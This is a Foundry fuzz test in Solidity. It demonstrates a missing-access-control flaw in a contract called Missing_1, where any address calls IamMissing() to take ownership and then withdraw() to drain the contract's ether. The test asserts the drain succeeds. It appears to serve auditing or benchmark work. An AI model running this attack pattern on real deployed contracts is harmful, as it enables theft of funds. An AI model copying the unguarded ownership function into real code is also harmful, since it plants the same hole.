
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {
    Missing_1 public _contractUnderTest;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        _contractUnderTest = new Missing_1();
        // Call IamMissing to set initial owner as this test contract
        _contractUnderTest.IamMissing();
        // Fund the contract so we can test withdrawal
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Record the caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;

        // --- 2. State Configuration ---
        // Fund the caller for gas (not strictly necessary but good practice)
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.startPrank(caller);

        // VULNERABILITY: Any user can call IamMissing() to become the owner
        // This is the critical vulnerability - no access control on ownership transfer
        _contractUnderTest.IamMissing();

        // Now the caller is the owner and can withdraw all funds
        _contractUnderTest.withdraw();

        vm.stopPrank();

        // Assert that the attack was successful
        // The caller should have received the contract's balance
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
        assertEq(caller.balance, 1 ether + contractBalanceBefore, "Caller should have received the funds");
    }
}
